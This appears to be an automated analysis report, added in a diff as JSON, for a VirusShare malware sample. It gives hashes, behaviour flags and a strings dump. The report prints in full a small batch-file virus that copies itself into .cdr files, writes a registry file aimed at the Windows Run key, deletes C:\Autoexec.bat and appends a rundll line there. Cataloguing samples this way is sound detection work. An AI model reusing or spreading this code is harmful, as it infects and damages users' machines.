@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Autoexec": "Runs when the Word document is opened",
+            "Run": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "\n@echo off\necho Dont Interrupt This Process, Theres a Chance That Win95/98 Will Corrupt! >> %0.cdr\n@break off\n:start\nECHO REGEDIT4>%windir%\\EnableBootup.reg\nECHO.>>%windir%\\EnableBootup.reg\nECHO [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]>>%windir%\\EnableBootup.reg\nECHO \"RegisteredOwner\"=\"Marta Lisa Westman\">>%windir%\\EnableBootup.reg\nECHO \"RegisteredOrganization\"=\"The Prison Camp Of Oxhamns School\">>%windir%\\EnableBootup.reg\nif (%1)==() goto viral_scan\n:viral_inf\nif exist  %0.cdr goto viral_end\ntype %0 > %1\ngoto viral_end\n:viral_scan\nfor %%f in (*.cdr) do call &0 %%f\nif exist %0.cdr del c:\\Autoexec.bat\nECHO rundll user,#7 0 5 >> C:\\Autoexec.bat\n:start\n\n\n\n\n\n\n"
+    },
+    "filename": "VirusShare_2ee44862e852de9fd74f8bdb5453bbb7",
+    "filesize": 718,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2ee44862e852de9fd74f8bdb5453bbb7",
+        "sha1": "753ece651eda083e7e1cce76957bf8acc23d7353",
+        "sha256": "7cda4b3ca7591bc84a9eeac637dc47524fcb41a2f7c14cd7b99b1f40d8e90d63"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "echo Dont Interrupt This Process, Theres a Chance That Win95/98 Will Corrupt! >> %0.cdr",
+            "@break off",
+            ":start",
+            "ECHO REGEDIT4>%windir%\\EnableBootup.reg",
+            "ECHO.>>%windir%\\EnableBootup.reg",
+            "ECHO [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]>>%windir%\\EnableBootup.reg",
+            "ECHO \"RegisteredOwner\"=\"Marta Lisa Westman\">>%windir%\\EnableBootup.reg",
+            "ECHO \"RegisteredOrganization\"=\"The Prison Camp Of Oxhamns School\">>%windir%\\EnableBootup.reg",
+            "if (%1)==() goto viral_scan",
+            ":viral_inf",
+            "if exist  %0.cdr goto viral_end",
+            "type %0 > %1",
+            "goto viral_end",
+            ":viral_scan",
+            "for %%f in (*.cdr) do call &0 %%f",
+            "if exist %0.cdr del c:\\Autoexec.bat",
+            "ECHO rundll user,#7 0 5 >> C:\\Autoexec.bat",
+            ":start"
+        ],
+        "file": {
+            "ECHO \"RegisteredOrganization\"=\"The Prison Camp Of Oxhamns School\">>%windir%\\EnableBootup.reg": "Registry",
+            "ECHO \"RegisteredOwner\"=\"Marta Lisa Westman\">>%windir%\\EnableBootup.reg": "Registry",
+            "ECHO REGEDIT4>%windir%\\EnableBootup.reg": "Registry",
+            "ECHO [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]>>%windir%\\EnableBootup.reg": "Registry",
+            "ECHO.>>%windir%\\EnableBootup.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.290757",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
